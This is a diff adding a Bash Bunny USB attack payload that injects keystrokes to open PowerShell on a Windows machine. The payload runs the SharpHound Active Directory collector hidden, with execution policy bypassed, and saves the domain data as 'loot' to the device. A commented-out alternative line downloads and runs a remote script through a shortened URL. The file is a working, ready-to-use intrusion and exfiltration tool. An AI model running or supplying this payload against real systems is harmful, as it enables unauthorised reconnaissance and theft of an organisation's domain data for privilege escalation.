@@ -1,0 +1,69 @@
+#!/bin/bash
+#
+# Title:         SharpHound
+# Description:   Six Degrees of Domain Admin
+# Author:        5h4d0W0lf
+# Version:       1.0
+# Category:      Exfiltration
+# Target:        Windows XP SP3+ (Powershell)
+# Attackmodes:   HID, Ethernet
+#
+# Analyzing Active Directory domain escalation attack paths
+# then export results in /root/udisk/loot/SharpHound/
+#
+# Credits to BloodHoundAD
+# https://github.com/BloodHoundAD/SharpHound
+#
+# LED                      Status                                       
+# ----------------------- + -------------------------------------------- 
+# SETUP                   + Setup
+# ATTACK                  + Wait SharpHound execution
+# CLEANUP                 + Wait to eject
+# FINISH                  + Finish
+#
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+LED SETUP
+LOOTDIR=/root/udisk/loot/SharpHound
+mkdir -p $LOOTDIR
+#cleanup any prior collection
+#rm $LOOTDIR/*
+
+ATTACKMODE HID STORAGE
+LED ATTACK
+
+# wait 6 seconds for the storage to popup, then open powershell and get bunny drive letter
+Q DELAY 6000
+Q GUI r
+Q DELAY 100
+Q STRING POWERSHELL
+Q ENTER
+Q DELAY 500
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 100
+
+########################################################################################################################
+# Execute SharpHound and retrieve domain info                                                                          #
+########################################################################################################################
+
+# LOCAL FROM BUNNY
+Q STRING PowerShell -NoP -NonI -W Hidden -Exec Bypass -c \"\& \{Import-Module -Name \$Bunny\\payloads\\${SWITCH_POSITION}\\SharpHound.ps1\; Invoke-BloodHound -Stealth -CSVFolder \$Bunny\\loot\\SharpHound}\"
+# Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nS1j5d\'\)\; Invoke-BloodHound -Stealth -CSVFolder \$Bunny\\loot\\SharpHound
+
+LED CLEANUP
+
+Q ENTER
+Q DELAY 100
+
+# Eject the USB Safely 
+Q STRING \$Eject \=  New-Object -comObject Shell.Application
+Q ENTER
+Q DELAY 100
+Q STRING \$Eject.NameSpace\(17\).ParseName\(\$Bunny\).InvokeVerb\(\"Eject\"\)
+Q ENTER
+Q STRING exit
+Q ENTER
+
+LED FINISH
